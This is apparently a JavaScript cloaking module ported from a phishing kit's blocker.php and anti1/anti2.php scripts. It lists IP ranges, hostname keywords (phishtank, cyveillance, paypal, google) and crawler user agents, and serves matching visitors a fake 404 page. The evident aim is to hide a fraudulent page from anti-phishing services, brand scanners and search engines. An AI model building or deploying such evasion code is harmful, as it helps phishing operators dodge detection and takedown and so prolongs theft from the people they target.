/**
 * Request blocker module
 * Converted from PHP blocker.php
 */
import dns from 'dns';
const BLOCKED_HOSTNAMES = [
    "above", "google", "softlayer", "amazonaws", "cyveillance",
    "phishtank", "dreamhost", "netpilot", "calyxinstitute",
    "tor-exit", "paypal"
];
const BANNED_IPS = [
    // Original blocker.php IPs
    "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*",
    "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*",
    "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*",
    "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*",
    "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*",
    "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*",
    "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*",
    "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.*",
    "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*",
    "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*",
    "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*",
    "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*",
    "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*",
    "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*",
    "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*",
    "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*",
    "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*",
    "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
    "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*",
    "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*",
    "^64.106.213.*",
    // Additional IPs from anti1.php
    "^185.187.*.*", "^185.187.30.*", "^173.239.*.*", "^173.244.36.*",
    "103.248.172.42", "69.25.58.61", "185.187.30.13", "178.24.121.188",
    "87.113.96.90", "165.227.0.128", "185.229.190.140", "165.227.0.128",
    "46.101.94.163", "165.227.39.194", "87.113.96.90", "46.101.119.24",
    "82.102.27.75", "173.239.230.97", "82.102.27.75", "87.113.96.90",
    "87.113.96.90", "159.203.0.156", "162.243.187.126", "82.102.27.75",
    "87.113.96.90", "103.248.172.42", "103.248.172.42", "47.30.133.89",
    "103.248.172.42", "173.239.240.147",
    // Additional IPs from anti2.php
    "^81.161.59.*", "^66.135.200.*", "^91.103.66.*", "^208.91.115.*",
    "^199.30.228.*"
];
const BLOCKED_USER_AGENTS = [
    'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot',
    'bingbot', 'crawler', 'PycURL', 'facebookexternalhit'
];
function getUserIP(req) {
    return req.ip || req.socket.remoteAddress || 'unknown';
}
function isIPBanned(ip) {
    // Check exact match first
    if (BANNED_IPS.includes(ip)) {
        return true;
    }
    // Check pattern matches
    for (const bannedIP of BANNED_IPS) {
        const regex = new RegExp(bannedIP);
        if (regex.test(ip)) {
            return true;
        }
    }
    return false;
}
async function isHostnameBlocked(ip) {
    try {
        const hostname = await new Promise((resolve, reject) => {
            dns.reverse(ip, (err, hostnames) => {
                if (err) {
                    reject(err);
                }
                else {
                    resolve(hostnames[0] || '');
                }
            });
        });
        for (const blockedWord of BLOCKED_HOSTNAMES) {
            if (hostname.toLowerCase().includes(blockedWord)) {
                return true;
            }
        }
        return false;
    }
    catch (error) {
        console.error('Error checking hostname:', error);
        return false;
    }
}
function isUserAgentBlocked(userAgent) {
    const lowerUserAgent = userAgent.toLowerCase();
    for (const blockedAgent of BLOCKED_USER_AGENTS) {
        if (lowerUserAgent.includes(blockedAgent.toLowerCase())) {
            return true;
        }
    }
    return false;
}
export async function blockRequest(req, res) {
    const ip = getUserIP(req);
    const userAgent = req.get('User-Agent') || '';
    // Check if IP is banned
    if (isIPBanned(ip)) {
        res.status(404).send('<h1>404 Not Found</h1>The page that you have requested could not be found.');
        return;
    }
    // Check if hostname is blocked
    if (await isHostnameBlocked(ip)) {
        res.status(404).send('<h1>404 Not Found</h1>The page that you have requested could not be found.');
        return;
    }
    // Check if user agent is blocked
    if (isUserAgentBlocked(userAgent)) {
        res.status(404).send('<h1>404 Not Found</h1>The page that you have requested could not be found.');
        return;
    }
    // Request is allowed, continue
}
//# sourceMappingURL=blocker.js.map